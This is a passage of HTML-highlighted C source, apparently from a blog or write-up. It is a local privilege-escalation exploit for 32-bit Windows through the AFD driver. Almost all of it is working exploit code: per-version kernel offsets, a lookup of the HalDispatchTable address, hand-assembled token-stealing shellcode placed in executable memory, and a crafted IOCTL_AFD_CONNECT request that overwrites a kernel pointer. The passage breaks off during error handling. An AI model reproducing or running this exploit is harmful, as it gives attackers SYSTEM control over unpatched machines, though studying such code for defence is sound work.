*securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">1</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.0, service pack 2, server</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">0</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">2</span>) &amp;&amp; (osvi.wProductType != <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows Server 2008 SP2</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows Server 2008 SP2\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xE0&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\x9C&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xA0&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x08</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.1, no service pack (note: Windows Server 2008 R2 is 64-bit only)</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">1</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows 7</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows 7\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x50&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xF8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\xB4&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xB8&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">1</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is 6.1, service pack 1 (note: Windows Server 2008 R2 is 64-bit only)</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((osvi.dwMajorVersion == <span class="number">6</span>) &amp;&amp; (osvi.dwMinorVersion == <span class="number">1</span>) &amp;&amp; (osvi.wServicePackMajor == <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is Windows 7 SP1</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [+] Windows 7 SP1\n&quot;</span>);</span><br><span class="line">        shellcode_KPROCESS = <span class="string">&#x27;\x50&#x27;</span>;</span><br><span class="line">        shellcode_TOKEN    = <span class="string">&#x27;\xF8&#x27;</span>;</span><br><span class="line">        shellcode_UPID     = <span class="string">&#x27;\xB4&#x27;</span>;</span><br><span class="line">        shellcode_APLINKS  = <span class="string">&#x27;\xB8&#x27;</span>;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *securityPatches[] = &#123;<span class="string">&quot;KB2503665&quot;</span>, <span class="string">&quot;KB2975684&quot;</span>&#125;;</span><br><span class="line">        securityPatchesPtr = securityPatches;</span><br><span class="line">        securityPatchesCount = <span class="number">2</span>;</span><br><span class="line">        lpInBufferSize = <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in case the OS version is not any of the previously checked versions</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// the target machine&#x27;s OS is an unsupported 32-bit Windows version</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Unsupported version\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      [*] Affected 32-bit operating systems\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows XP SP3\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Server 2003 SP2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Vista SP1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Vista SP2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Server 2008\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows Server 2008 SP2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows 7\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [*] Windows 7 SP1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// LOCATE REQUIRED OS COMPONENTS</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Locating required OS components\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// retrieve system information</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms725506(v=vs.85).aspx</span></span><br><span class="line">    <span class="comment">// locate &quot;ZwQuerySystemInformation&quot; in the &quot;ntdll.dll&quot; module</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx</span></span><br><span class="line">    FARPROC ZwQuerySystemInformation;</span><br><span class="line">    ZwQuerySystemInformation = GetProcAddress(GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11 = SystemModuleInformation</span></span><br><span class="line">    <span class="comment">//   http://winformx.florian-rappl.de/html/e6d5d5c1-8d83-199b-004f-8767439c70eb.htm</span></span><br><span class="line">    ULONG systemInformation;</span><br><span class="line">    ZwQuerySystemInformation(<span class="number">11</span>, (PVOID) &amp;systemInformation, <span class="number">0</span>, &amp;systemInformation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate memory for the list of loaded modules</span></span><br><span class="line">    ULONG *systemInformationBuffer;</span><br><span class="line">    systemInformationBuffer = (ULONG *) <span class="built_in">malloc</span>(systemInformation * <span class="keyword">sizeof</span>(*systemInformationBuffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!systemInformationBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not allocate memory&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// retrieve the list of loaded modules</span></span><br><span class="line">    ZwQuerySystemInformation(<span class="number">11</span>, systemInformationBuffer, systemInformation * <span class="keyword">sizeof</span>(*systemInformationBuffer), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// locate &quot;ntkrnlpa.exe&quot; or &quot;ntoskrnl.exe&quot; in the retrieved list of loaded modules</span></span><br><span class="line">    ULONG i;</span><br><span class="line">    PVOID targetKrnlMdlBaseAddr;</span><br><span class="line">    HMODULE targetKrnlMdlUsrSpcOffs;</span><br><span class="line">    BOOL foundModule = FALSE;</span><br><span class="line">    PSYSTEM_MODULE_INFORMATION loadedMdlStructPtr;</span><br><span class="line">    loadedMdlStructPtr = (PSYSTEM_MODULE_INFORMATION) (systemInformationBuffer + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; *systemInformationBuffer; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(loadedMdlStructPtr[i].ImageName, <span class="string">&quot;ntkrnlpa.exe&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   [+] ntkrnlpa.exe\n&quot;</span>);</span><br><span class="line">            targetKrnlMdlUsrSpcOffs = LoadLibraryExA(<span class="string">&quot;ntkrnlpa.exe&quot;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;</span><br><span class="line">            foundModule = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strstr</span>(loadedMdlStructPtr[i].ImageName, <span class="string">&quot;ntoskrnl.exe&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   [+] ntoskrnl.exe\n&quot;</span>);</span><br><span class="line">            targetKrnlMdlUsrSpcOffs = LoadLibraryExA(<span class="string">&quot;ntoskrnl.exe&quot;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;</span><br><span class="line">            foundModule = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// base address of the loaded module (kernel space)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Address:      %#010x\n&quot;</span>, targetKrnlMdlBaseAddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// offset address (relative to the parent process) of the loaded module (user space)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Offset:       %#010x\n&quot;</span>, targetKrnlMdlUsrSpcOffs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!foundModule)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not find ntkrnlpa.exe/ntoskrnl.exe\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free allocated buffer space</span></span><br><span class="line">    <span class="built_in">free</span>(systemInformationBuffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// determine the address of the &quot;HalDispatchTable&quot; process (kernel space)</span></span><br><span class="line">    <span class="comment">// locate the offset fo the &quot;HalDispatchTable&quot; process within the target module (user space)</span></span><br><span class="line">    ULONG_PTR HalDispatchTableUsrSpcOffs;</span><br><span class="line">    HalDispatchTableUsrSpcOffs = (ULONG_PTR) GetProcAddress(targetKrnlMdlUsrSpcOffs, <span class="string">&quot;HalDispatchTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!HalDispatchTableUsrSpcOffs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      [-] Could not find HalDispatchTable\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [+] HalDispatchTable\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [*] Offset:    %#010x\n&quot;</span>, HalDispatchTableUsrSpcOffs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate the address of &quot;HalDispatchTable&quot; in kernel space</span></span><br><span class="line">    <span class="comment">// 1. identify the base address of the target module in kernel space</span></span><br><span class="line">    <span class="comment">// 2. previous step&#x27;s result [minus] the load address of the same module in user space</span></span><br><span class="line">    <span class="comment">// 3. previous step&#x27;s result [plus] the address of &quot;HalDispatchTable&quot; in user space</span></span><br><span class="line">    <span class="comment">// EQUIVALENT TO:</span></span><br><span class="line">    <span class="comment">// 1. determine RVA of HalDispatchTable</span></span><br><span class="line">    <span class="comment">// *Relative Virtual Address - the address of an item after it is loaded into memory, with the base address of the image file subtracted from it.</span></span><br><span class="line">    <span class="comment">// 2. previous step&#x27;s result [plus] base address of target module in kernel space</span></span><br><span class="line">    ULONG_PTR HalDispatchTableKrnlSpcAddr;</span><br><span class="line">    HalDispatchTableKrnlSpcAddr = HalDispatchTableUsrSpcOffs - (ULONG_PTR) targetKrnlMdlUsrSpcOffs;</span><br><span class="line">    HalDispatchTableKrnlSpcAddr += (ULONG_PTR) targetKrnlMdlBaseAddr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// locate &quot;NtQueryIntervalProfile&quot; in the &quot;ntdll.dll&quot; module</span></span><br><span class="line">    PNTQUERYINTERVAL NtQueryIntervalProfile;</span><br><span class="line">    NtQueryIntervalProfile = (PNTQUERYINTERVAL) GetProcAddress(GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryIntervalProfile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!NtQueryIntervalProfile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not find NtQueryIntervalProfile\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [+] NtQueryIntervalProfile\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Address:      %#010x\n&quot;</span>, NtQueryIntervalProfile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// locate &quot;ZwDeviceIoControlFile&quot; routine in the &quot;ntdll.dll&quot; module</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/hardware/ff566441(v=vs.85).aspx</span></span><br><span class="line">    FARPROC ZwDeviceIoControlFile;</span><br><span class="line">    ZwDeviceIoControlFile = GetProcAddress(GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwDeviceIoControlFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!ZwDeviceIoControlFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   [-] Could not find ZwDeviceIoControlFile\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [+] ZwDeviceIoControlFile\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Address:      %#010x\n&quot;</span>, ZwDeviceIoControlFile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// SETUP EXPLOITATION PREREQUISITE</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Setting up exploitation prerequisite\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialize Winsock DLL</span></span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;   [*] Initialising Winsock DLL\n&quot;</span>);</span><br><span class="line">    WORD wVersionRequested;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> wsaStartupErrorCode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms632663(v=vs.85).aspx</span></span><br><span class="line">    wVersionRequested = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initiate the use of the Winsock DLL</span></span><br><span class="line">    <span class="comment">//   https://msdn.microsoft.com/en-us/library/windows/desktop/ms742213(v=vs.85).aspx</span></span><br><span class="line">    wsaStartupErrorCode = WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(wsaStartupErrorCode != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      [-] Failed (error code: %d)\n&quot;</span>, wsaStartupErrorCode);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create socket</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Creating socket\n&quot;</span>);</span><br><span class="line">    SOCKET targetDeviceSocket = INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx</span></span><br><span class="line">    targetDeviceSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(targetDeviceSocket == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         [-] Failed (error code: %ld)\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// connect to a closed port</span></span><br><span class="line">    <span class="comment">// connect to port 0 on the local machine</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientService</span>;</span></span><br><span class="line">    clientService.sin_family = AF_INET;</span><br><span class="line">    clientService.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    clientService.sin_port = htons(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [*] Connecting to closed port\n&quot;</span>);</span><br><span class="line">    <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms737625(v=vs.85).aspx</span></span><br><span class="line">    <span class="type">int</span> connectResult;</span><br><span class="line">    connectResult = connect(targetDeviceSocket, (SOCKADDR *) &amp;clientService, <span class="keyword">sizeof</span>(clientService));</span><br><span class="line">    <span class="keyword">if</span> (connectResult == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;            [-] Connected (error code: %ld)\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// CREATE TOKEN STEALING SHELLCODE</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating token stealing shellcode\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct the token stealing shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x52</span>,                                                        <span class="comment">// PUSH EDX                     Save EDX on the stack (save context)</span></span><br><span class="line">        <span class="number">0x53</span>,                                                         <span class="comment">// PUSH EBX                     Save EBX on the stack (save context)</span></span><br><span class="line">        <span class="number">0x33</span>,<span class="number">0xC0</span>,                                                   <span class="comment">// XOR EAX, EAX                 Zero out EAX (EAX = 0)</span></span><br><span class="line">        <span class="number">0x64</span>,<span class="number">0x8B</span>,<span class="number">0x80</span>,<span class="number">0x24</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                          <span class="comment">// MOV EAX, FS:[EAX+0x124]      Retrieve current _KTHREAD structure</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x40</span>,shellcode_KPROCESS,                                <span class="comment">// MOV EAX, [EAX+_KPROCESS]     Retrieve _EPROCESS structure</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0xC8</span>,                                                   <span class="comment">// MOV ECX, EAX                 Copy EAX (_EPROCESS) to ECX</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x98</span>,shellcode_TOKEN,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                    <span class="comment">// MOV EBX, [EAX+_TOKEN]        Retrieve current _TOKEN</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x80</span>,shellcode_APLINKS,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                  <span class="comment">// MOV EAX, [EAX+_APLINKS] &lt;-|  Retrieve FLINK from ActiveProcessLinks</span></span><br><span class="line">        <span class="number">0x81</span>,<span class="number">0xE8</span>,shellcode_APLINKS,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                  <span class="comment">// SUB EAX, _APLINKS         |  Retrieve EPROCESS from ActiveProcessLinks</span></span><br><span class="line">        <span class="number">0x81</span>,<span class="number">0xB8</span>,shellcode_UPID,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// CMP [EAX+_UPID], 0x4      |  Compare UniqueProcessId with 4 (System Process)</span></span><br><span class="line">        <span class="number">0x75</span>,<span class="number">0xE8</span>,                                                   <span class="comment">// JNZ/JNE                ----  Jump if not zero/not equal</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0x90</span>,shellcode_TOKEN,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                    <span class="comment">// MOV EDX, [EAX+_TOKEN]        Copy SYSTEM _TOKEN to EDX</span></span><br><span class="line">        <span class="number">0x8B</span>,<span class="number">0xC1</span>,                                                   <span class="comment">// MOV EAX, ECX                 Copy ECX (current process _TOKEN) to EAX</span></span><br><span class="line">        <span class="number">0x89</span>,<span class="number">0x90</span>,shellcode_TOKEN,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                    <span class="comment">// MOV [EAX+_TOKEN], EDX        Copy SYSTEM _TOKEN to current process _TOKEN</span></span><br><span class="line">        <span class="number">0x5B</span>,                                                        <span class="comment">// POP EBX                      Pop current stack value to EBX (restore context)</span></span><br><span class="line">        <span class="number">0x5A</span>,                                                        <span class="comment">// POP EDX                      Pop current stack value to EDX (restore context)</span></span><br><span class="line">        <span class="number">0xC2</span>,<span class="number">0x08</span>                                                    <span class="comment">// RET 8                        Return</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] Shellcode assembled\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate memory (RWE permissions) for the shellcode</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] Allocating memory\n&quot;</span>);</span><br><span class="line">    LPVOID shellcodeAddress;</span><br><span class="line">    shellcodeAddress = VirtualAlloc((PVOID) <span class="number">0x02070000</span>, <span class="number">0x20000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="type">int</span> errorCode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(shellcodeAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        errorCode = GetLastError();</span><br><span class="line">        <span class="comment">// in case of ERROR_INVALID_ADDRESS</span></span><br><span class="line">        <span class="keyword">if</span>(errorCode == <span class="number">487</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Attempt to access invalid address</span></span><br><span class="line">            <span class="comment">// occurs since a fixed address is being reserved</span></span><br><span class="line">            <span class="comment">//   http://stackoverflow.com/questions/21368429/error-code-487-error-invalid-address-when-using-virtualallocex</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [!] Could not reserve entire range\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;         [*] Rerun exploit\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// in case of any other error</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [-] Failed (error code: %d)\n&quot;</span>, errorCode);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [+] Address:      %#010x\n&quot;</span>, shellcodeAddress);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy the shellcode to the allocated memory</span></span><br><span class="line">    <span class="built_in">memset</span>(shellcodeAddress, <span class="number">0x90</span>, <span class="number">0x20000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((shellcodeAddress + <span class="number">0x10000</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Shellcode copied\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// EXPLOIT THE VULNERABILITY</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Exploiting vulnerability\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// send AFD socket connect request</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   [*] Sending AFD socket connect request\n&quot;</span>);</span><br><span class="line">    DWORD lpInBuffer[lpInBufferSize];</span><br><span class="line">    <span class="built_in">memset</span>(lpInBuffer, <span class="number">0</span>, (lpInBufferSize * <span class="keyword">sizeof</span>(DWORD)));</span><br><span class="line"></span><br><span class="line">    lpInBuffer[<span class="number">3</span>] = <span class="number">0x01</span>;</span><br><span class="line">    lpInBuffer[<span class="number">4</span>] = <span class="number">0x20</span>;</span><br><span class="line">    ULONG lpBytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(DeviceIoControl(</span><br><span class="line">        (HANDLE) targetDeviceSocket,</span><br><span class="line">        <span class="number">0x00012007</span>,                                                        <span class="comment">// IOCTL_AFD_CONNECT</span></span><br><span class="line">        (PVOID) lpInBuffer, <span class="keyword">sizeof</span>(lpInBuffer),</span><br><span class="line">        (PVOID) (HalDispatchTableKrnlSpcAddr + <span class="number">0x6</span>), <span class="number">0x0</span>,</span><br><span class="line">        &amp;lpBytesReturned, <span class="literal">NULL</span></span><br><span class="line">        ) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx</span></span><br><span class="line">        errorCode = GetLastError();</span><br><span class="line">        <span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx</span></span><br><span class="line">        <span class="comment">// in case of ERROR_INVALID_NETNAME</span></span><br><span class="line">        <span class="keyword">if</span>(errorCode == <span class="number">1214</span>)</span><br><span class="line">        